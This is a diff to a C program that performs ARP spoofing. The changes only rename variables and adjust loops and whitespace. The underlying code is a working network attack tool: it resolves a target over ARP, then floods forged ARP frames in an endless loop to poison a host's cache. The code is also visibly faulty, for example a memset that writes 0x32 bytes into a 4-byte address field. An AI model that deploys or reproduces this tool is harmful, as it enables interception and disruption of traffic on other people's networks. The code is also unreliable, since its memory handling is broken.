@@ -13,17 +13,17 @@
 int main(int argc, const char* argv[])
 {
 	const char* if_name = argv[1];
-	const char* SenderIPstring = argv[2];
-	const char* TargetIPstring = argv[3];
+	const char* sender_ip_string = argv[2];
+	const char* target_ip_string = argv[3];
 	char* my_ip_string;
 	char* sender_packet[0x3c];
-	while (1) {
-		Send_ArpRequest(if_name, SenderIPstring, TargetIPstring);
+	while (true) {
+		Send_ArpRequest(if_name, sender_ip_string, target_ip_string);
 	}
 	return 0;
 }
 
-void ArpSpoof(const char* if_name, const char* SenderIPstring, const char* TargetIPstring, const u_char* packet) {
+void ArpSpoof(const char* if_name, const char* sender_ip_string, const char* target_ip_string, const u_char* packet) {
 
 	struct ifreq ifr;
 	size_t if_name_len = strlen(if_name);
@@ -71,7 +71,7 @@ void ArpSpoof(const char* if_name, const char* SenderIPstring, const char* Targe
 	memcpy(&req.arp_spa, packet + 0x1c, 0x04);
 	memcpy(&req.arp_tha, packet + 0x16, sizeof(req.arp_tha));
 
-	memset(&req.arp_tpa, inet_addr(TargetIPstring), 0x32);
+	memset(&req.arp_tpa, inet_addr(target_ip_string), 0x32);
 
 
 	unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
@@ -88,7 +88,7 @@ void ArpSpoof(const char* if_name, const char* SenderIPstring, const char* Targe
 		return; 
 	}
 	
-	while (1) {
+	while (true) {
 		pcap_sendpacket(pcap, frame, sizeof(frame));
 	}
 	pcap_close(pcap);
@@ -97,7 +97,7 @@ void ArpSpoof(const char* if_name, const char* SenderIPstring, const char* Targe
 
 }
 
-void Send_ArpRequest(const char* if_name, const char* SenderIPstring, const char* TargetIPstring) {
+void Send_ArpRequest(const char* if_name, const char* sender_ip_string, const char* target_ip_string) {
 
 	struct ether_header header;
 	header.ether_type = htons(ETH_P_ARP);
@@ -113,8 +113,8 @@ void Send_ArpRequest(const char* if_name, const char* SenderIPstring, const char
 
 
 	struct in_addr sender_ip_addr = { 0 };
-	if (!inet_aton(SenderIPstring, &sender_ip_addr)) {
-		fprintf(stderr, "%s is not a valid IP address", SenderIPstring);
+	if (!inet_aton(sender_ip_string, &sender_ip_addr)) {
+		fprintf(stderr, "%s is not a valid IP address", sender_ip_string);
 		exit(1);
 	}
 	memcpy(&req.arp_tpa, &sender_ip_addr.s_addr, sizeof(req.arp_tpa));
@@ -137,6 +137,8 @@ void Send_ArpRequest(const char* if_name, const char* SenderIPstring, const char
 		perror(0);
 		exit(1);
 	}
+
+
 	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
 		perror(0);
 		close(fd);
@@ -165,7 +167,8 @@ void Send_ArpRequest(const char* if_name, const char* SenderIPstring, const char
 	unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
 	memcpy(frame, &header, sizeof(struct ether_header));
 	memcpy(frame + sizeof(struct ether_header), &req, sizeof(struct ether_arp));
-	
+
+
 	char pcap_errbuf[PCAP_ERRBUF_SIZE];
 	struct pcap_pkthdr h;
 	const u_char* packet;
@@ -179,13 +182,14 @@ void Send_ArpRequest(const char* if_name, const char* SenderIPstring, const char
 		exit(1);
 	}
 
+
 	if (pcap_inject(pcap, frame, sizeof(frame)) == -1) {
 		pcap_perror(pcap, 0);
 		pcap_close(pcap);
 		exit(1);
 	}
 	packet = pcap_next(pcap, &h);
-	ArpSpoof(if_name, SenderIPstring, TargetIPstring, packet);
+	ArpSpoof(if_name, sender_ip_string, target_ip_string, packet);
 	pcap_close(pcap);
 }
 
